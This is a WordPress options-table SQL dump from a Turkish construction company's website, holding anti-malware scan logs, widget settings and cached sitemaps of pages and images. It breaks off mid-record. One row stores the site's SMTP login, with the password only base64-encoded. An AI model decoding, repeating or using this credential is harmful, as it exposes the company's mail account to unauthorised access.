INSERT INTO `cmrfu_options` VALUES("15417","GOTMLS_scan_log/195.142.216.94/1477778328.0224","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:28:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:0:{}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:2:{i:0;s:8:\"backdoor\";i:1;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1477778361;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:540;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1477778900.1970479;s:6:\"finish\";i:1477778901;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15418","GOTMLS_scan_log/195.142.216.94/1477778920.3234","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:28:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:0:{}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:1:{i:0;s:8:\"backdoor\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1477778920;s:4:\"type\";s:10:\"Quick Scan\";s:9:\"microtime\";d:20;s:7:\"percent\";i:100;s:11:\"last_threat\";d:1477778940.2197449;s:6:\"finish\";i:1477778940;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15419","GOTMLS_scan_log/195.142.216.94/1477778955.6805","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:4:\"80px\";i:1;s:4:\"40px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:28:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:0:{}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"htaccess\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1477778956;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:810;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1477779766.757844;s:6:\"finish\";i:1477779766;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15463","widget_pages","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15464","widget_calendar","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15465","widget_tag_cloud","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15433","smtp_mailer_options","a:8:{s:9:\"smtp_host\";s:14:\"smtp.yandex.ru\";s:9:\"smtp_auth\";s:4:\"true\";s:13:\"smtp_username\";s:19:\"info@herkonyapi.com\";s:13:\"smtp_password\";s:12:\"aGVya29uMTIz\";s:18:\"type_of_encryption\";s:3:\"tls\";s:9:\"smtp_port\";s:3:\"587\";s:10:\"from_email\";s:19:\"info@herkonyapi.com\";s:9:\"from_name\";s:12:\"Herkon Yapı\";}","yes");
INSERT INTO `cmrfu_options` VALUES("15466","widget_nav_menu","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15467","finished_splitting_shared_terms","1","yes");
INSERT INTO `cmrfu_options` VALUES("15468","site_icon","0","yes");
INSERT INTO `cmrfu_options` VALUES("15469","medium_large_size_w","768","yes");
INSERT INTO `cmrfu_options` VALUES("15470","medium_large_size_h","0","yes");
INSERT INTO `cmrfu_options` VALUES("15476","widget_er_leaf_recent_projects_widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15477","widget_er_leaf_recent_posts_widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15478","widget_recent-posts-widget","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15479","widget_er_leaf_embed_code","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15480","widget_er_leaf_contact_info","a:1:{s:12:\"_multiwidget\";i:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("15499","wpseo_sitemap_cache_validator_global","3bWtF","no");
INSERT INTO `cmrfu_options` VALUES("20485","wpseo_sitemap_portfolio_tag_cache_validator","3AaoA","no");
INSERT INTO `cmrfu_options` VALUES("20486","_transient_timeout_yst_sm_portfolio_tag_1:3bWtF_3AaoA","1489312470","no");
INSERT INTO `cmrfu_options` VALUES("20487","_transient_yst_sm_portfolio_tag_1:3bWtF_3AaoA","C:24:\"WPSEO_Sitemap_Cache_Data\":48:{a:2:{s:6:\"status\";s:5:\"error\";s:3:\"xml\";s:0:\"\";}}","no");
INSERT INTO `cmrfu_options` VALUES("21133","_transient_timeout_yst_sm_page_1:3bWtF_fX2","1490363166","no");
INSERT INTO `cmrfu_options` VALUES("21134","_transient_yst_sm_page_1:3bWtF_fX2","C:24:\"WPSEO_Sitemap_Cache_Data\":9474:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:9426:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.herkonyapi.com/</loc>
		<lastmod>2016-11-05T02:09:15+02:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/blog/</loc>
		<lastmod>2014-06-02T14:15:14+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/projeler/</loc>
		<lastmod>2014-06-02T14:10:29+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/iletisim/</loc>
		<lastmod>2014-08-29T22:28:33+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/kurumsal/</loc>
		<lastmod>2014-08-29T22:29:35+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/neden-kentsel-donusum/</loc>
		<lastmod>2014-08-29T22:44:51+03:00</lastmod>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/bina-yenileme-11.jpg</image:loc>
			<image:caption><![CDATA[bina-yenileme-11]]></image:caption>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/kentsel-donusum/</loc>
		<lastmod>2014-08-29T22:45:22+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/cozum-ortaklari/</loc>
		<lastmod>2014-08-29T23:11:40+03:00</lastmod>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/baykaralar.png</image:loc>
			<image:caption><![CDATA[baykaralar]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/canakkale_seramik.png</image:loc>
			<image:caption><![CDATA[canakkale_seramik]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/day_yapi.png</image:loc>
			<image:caption><![CDATA[day_yapi]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/kabinet.png</image:loc>
			<image:caption><![CDATA[kabinet]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/KlimaPlus.png</image:loc>
			<image:caption><![CDATA[KlimaPlus]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0000_mood.png</image:loc>
			<image:caption><![CDATA[logo_0000_mood]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0001_drlight1.png</image:loc>
			<image:caption><![CDATA[logo_0001_drlight1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0002_yutas1.png</image:loc>
			<image:caption><![CDATA[logo_0002_yutas1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0003_vitra.png</image:loc>
			<image:caption><![CDATA[logo_0003_vitra]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0004_viko1.png</image:loc>
			<image:caption><![CDATA[logo_0004_viko1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0005_siemens1.png</image:loc>
			<image:caption><![CDATA[logo_0005_siemens1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0007_seranit1.png</image:loc>
			<image:caption><![CDATA[logo_0007_seranit1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0008_scavolini1.png</image:loc>
			<image:caption><![CDATA[logo_0008_scavolini1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0009_rehau1.png</image:loc>
			<image:caption><![CDATA[logo_0009_rehau1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0010_onalanlar1.png</image:loc>
			<image:caption><![CDATA[logo_0010_onalanlar1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0011_lineadecor1.png</image:loc>
			<image:caption><![CDATA[logo_0011_lineadecor1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0012_legrand1.png</image:loc>
			<image:caption><![CDATA[logo_0012_legrand1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/ege_seramik.jpg</image:loc>
			<image:caption><![CDATA[ege_seramik]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/franke.gif</image:loc>
			<image:caption><![CDATA[franke]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/mitsubishi_klima.png</image:loc>
			<image:caption><![CDATA[mitsubishi_klima]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0013_kommerling1.png</image:loc>
			<image:caption><![CDATA[logo_0013_kommerling1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0014_intema.png</image:loc>
			<image:caption><![CDATA[logo_0014_intema]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0015_huni1.png</image:loc>
			<image:caption><![CDATA[logo_0015_huni1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0016_hoppe1.png</image:loc>
			<image:caption><![CDATA[logo_0016_hoppe1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0018_fibrobeton1.png</image:loc>
			<image:caption><![CDATA[logo_0018_fibrobeton1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0019_betofiber1.png</image:loc>
			<image:caption><![CDATA[logo_0019_betofiber1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0020_aparici1.png</image:loc>
			<image:caption><![CDATA[logo_0020_aparici1]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0021_innsu.png</image:loc>
			<image:caption><![CDATA[logo_0021_innsu]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0022_eskiz.png</image:loc>
			<image:caption><![CDATA[logo_0022_eskiz]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/logo_0023_toskar.png</image:loc>
			<image:caption><![CDATA[logo_0023_toskar]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/md_prekast.png</image:loc>
			<image:caption><![CDATA[md_prekast]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/okcam_mobilya.png</image:loc>
			<image:caption><![CDATA[okcam_mobilya]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/Pimapen-011.png</image:loc>
			<image:caption><![CDATA[Pimapen-011]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/seldur_elektrik.png</image:loc>
			<image:caption><![CDATA[seldur_elektrik]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/serifoglu-011.png</image:loc>
			<image:caption><![CDATA[serifoglu-011]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/seyithanoglu_ahsap.png</image:loc>
			<image:caption><![CDATA[seyithanoglu_ahsap]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/tepe_insaat_malzemeleri.png</image:loc>
			<image:caption><![CDATA[tepe_insaat_malzemeleri]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/Winsa-011.png</image:loc>
			<image:caption><![CDATA[Winsa-011]]></image:caption>
		</image:image>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/yuksel_elektrik.png</image:loc>
			<image:caption><![CDATA[yuksel_elektrik]]></image:caption>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/herkon-yapi/</loc>
		<lastmod>2014-08-30T00:39:37+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2014/08/4.jpg</image:loc>
			<image:caption><![CDATA[4]]></image:caption>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/deprem-tedbirleri/</loc>
		<lastmod>2014-10-06T15:33:35+03:00</lastmod>
		<image:image>
			<image:loc>http://herkonyapi.com/wp-content/uploads/2014/08/deprem-gercegi.png</image:loc>
			<image:caption><![CDATA[deprem-gercegi]]></image:caption>
		</image:image>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("21137","_transient_yst_sm_1_1:3bWtF_3ytVl","C:24:\"WPSEO_Sitemap_Cache_Data\":1050:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:1002:\"<sitemapindex xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<sitemap>
		<loc>https://www.herkonyapi.com/post-sitemap.xml</loc>
		<lastmod>2014-06-02T14:25:06+03:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.herkonyapi.com/page-sitemap.xml</loc>
		<lastmod>2016-11-05T02:09:15+02:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.herkonyapi.com/attachment-sitemap.xml</loc>
		<lastmod>2014-08-30T00:38:04+03:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.herkonyapi.com/portfolio-sitemap.xml</loc>
		<lastmod>2014-06-02T13:40:27+03:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.herkonyapi.com/category-sitemap.xml</loc>
		<lastmod>2014-06-02T14:25:06+03:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.herkonyapi.com/portfolio_category-sitemap.xml</loc>
		<lastmod>2014-06-02T13:40:27+03:00</lastmod>
	</sitemap>
	<sitemap>
		<loc>https://www.herkonyapi.com/author-sitemap.xml</loc>
		<lastmod>2017-02-04T23:34:36+02:00</lastmod>
	</sitemap>
</sitemapindex>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("20502","_transient_timeout_yst_sm_portfolio_category_1:3bWtF_4Tnx","1489518841","no");
INSERT INTO `cmrfu_options` VALUES("20503","_transient_yst_sm_portfolio_category_1:3bWtF_4Tnx","C:24:\"WPSEO_Sitemap_Cache_Data\":741:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:694:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.herkonyapi.com/portfolio_category/daire/</loc>
		<lastmod>2014-06-02T13:40:27+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio_category/dukkan/</loc>
		<lastmod>2014-06-02T12:30:05+03:00</lastmod>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio_category/satilik/</loc>
		<lastmod>2014-06-02T13:40:27+03:00</lastmod>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("20504","_transient_timeout_yst_sm_author_1:3bWtF_6CeaH","1489521783","no");
INSERT INTO `cmrfu_options` VALUES("20505","_transient_yst_sm_author_1:3bWtF_6CeaH","C:24:\"WPSEO_Sitemap_Cache_Data\":474:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:427:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.herkonyapi.com/author/herkon123/</loc>
		<lastmod>2017-02-04T23:34:36+02:00</lastmod>
	</url>
</urlset>\";}}","no");
INSERT INTO `cmrfu_options` VALUES("21118","_transient_timeout_yst_sm_attachment_1:3bWtF_4LWQ","1490347921","no");
INSERT INTO `cmrfu_options` VALUES("21119","_transient_yst_sm_attachment_1:3bWtF_4LWQ","C:24:\"WPSEO_Sitemap_Cache_Data\":36433:{a:2:{s:6:\"status\";s:2:\"ok\";s:3:\"xml\";s:36384:\"<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:image=\"http://www.google.com/schemas/sitemap-image/1.1\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/nophoto/</loc>
		<lastmod>2014-02-19T22:17:13+02:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/nophoto.png</image:loc>
			<image:title><![CDATA[nophoto]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/9/</loc>
		<lastmod>2014-06-02T12:27:53+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/9.jpg</image:loc>
			<image:title><![CDATA[9]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/1/</loc>
		<lastmod>2014-06-02T12:28:08+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/1.jpg</image:loc>
			<image:title><![CDATA[1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/2/</loc>
		<lastmod>2014-06-02T12:28:10+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/2.jpg</image:loc>
			<image:title><![CDATA[2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/3/</loc>
		<lastmod>2014-06-02T12:28:12+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/3.jpg</image:loc>
			<image:title><![CDATA[3]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/4/</loc>
		<lastmod>2014-06-02T12:28:14+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/4.jpg</image:loc>
			<image:title><![CDATA[4]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/5/</loc>
		<lastmod>2014-06-02T12:28:16+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/5.jpg</image:loc>
			<image:title><![CDATA[5]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/6/</loc>
		<lastmod>2014-06-02T12:28:18+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/6.jpg</image:loc>
			<image:title><![CDATA[6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/7/</loc>
		<lastmod>2014-06-02T12:28:19+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/7.jpg</image:loc>
			<image:title><![CDATA[7]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/8/</loc>
		<lastmod>2014-06-02T12:28:21+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/8.jpg</image:loc>
			<image:title><![CDATA[8]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/9-2/</loc>
		<lastmod>2014-06-02T12:28:23+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/91.jpg</image:loc>
			<image:title><![CDATA[9]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-dukkan/attachment/10/</loc>
		<lastmod>2014-06-02T12:28:25+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/10.jpg</image:loc>
			<image:title><![CDATA[10]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_1/</loc>
		<lastmod>2014-06-02T13:07:54+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_1.jpg</image:loc>
			<image:title><![CDATA[New_1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_1-2/</loc>
		<lastmod>2014-06-02T13:08:29+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_11.jpg</image:loc>
			<image:title><![CDATA[New_1]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_2/</loc>
		<lastmod>2014-06-02T13:08:30+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_2.jpg</image:loc>
			<image:title><![CDATA[New_2]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_3/</loc>
		<lastmod>2014-06-02T13:08:32+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_3.jpg</image:loc>
			<image:title><![CDATA[New_3]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_4/</loc>
		<lastmod>2014-06-02T13:08:34+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_4.jpg</image:loc>
			<image:title><![CDATA[New_4]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_5/</loc>
		<lastmod>2014-06-02T13:08:36+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_5.jpg</image:loc>
			<image:title><![CDATA[New_5]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_6/</loc>
		<lastmod>2014-06-02T13:08:37+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_6.jpg</image:loc>
			<image:title><![CDATA[New_6]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_7/</loc>
		<lastmod>2014-06-02T13:08:39+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_7.jpg</image:loc>
			<image:title><![CDATA[New_7]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_8/</loc>
		<lastmod>2014-06-02T13:08:41+03:00</lastmod>
		<image:image>
			<image:loc>https://www.herkonyapi.com/wp-content/uploads/2013/10/New_8.jpg</image:loc>
			<image:title><![CDATA[New_8]]></image:title>
		</image:image>
	</url>
	<url>
		<loc>https://www.herkonyapi.com/portfolio-item/alpay-konak-kat-3/new_9/</loc>
		<lastmod>2014-06-02T13:08:43+03:00</lastmod>
		<image:image>
